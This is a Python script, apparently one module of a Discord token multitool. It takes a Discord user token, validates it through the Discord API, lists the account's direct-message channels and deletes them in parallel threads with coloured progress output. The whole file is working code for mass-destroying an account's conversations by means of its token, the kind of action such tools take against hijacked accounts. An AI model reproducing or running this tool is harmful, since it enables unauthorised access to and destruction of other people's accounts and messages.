from Config.Util import *
from Config.Config import *
from Config.Translates import *

current_language = LANGUAGE

def tr(key):
    return translations[current_language].get(key, key)

try:
    import requests
    import threading
except Exception as e:
   ErrorModule(e)
   
Title("Discord Token Delete Dm")

try:
    print()
    token = Choice1TokenDiscord()
    r = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
    if r.status_code == 200:
        pass
    else:
        ErrorToken()

    def DmDeleter(token, channels):
        for channel in channels:
            try:
                requests.delete(f'https://discord.com/api/v7/channels/'+channel['id'], headers={'Authorization': token})
                print(f"{primary}[{secondary}{current_time_hour()}{primary}] {ADD} Status: {secondary}{tr('Delete')}{primary} | {tr('Channel')}: {color.WHITE}{channel['id']}")
            except Exception as e:
                print(f"{primary}[{secondary}{current_time_hour()}{primary}] {ERROR} Status: {secondary}{tr('Error')}: {e}{primary}")

    processes = []
    channel_id = requests.get("https://discord.com/api/v9/users/@me/channels", headers={'Authorization': token}).json()
    if not channel_id:
        print(f"{INFO} {tr('NoDm')}.")
        Continue()
        Reset()

    for channel in [channel_id[i:i+3] for i in range(0, len(channel_id), 3)]:
            t = threading.Thread(target=DmDeleter, args=(token, channel))
            t.start()
            processes.append(t)
    for process in processes:
        process.join()
    Continue()
    Reset()
except Exception as e:
    Error(e)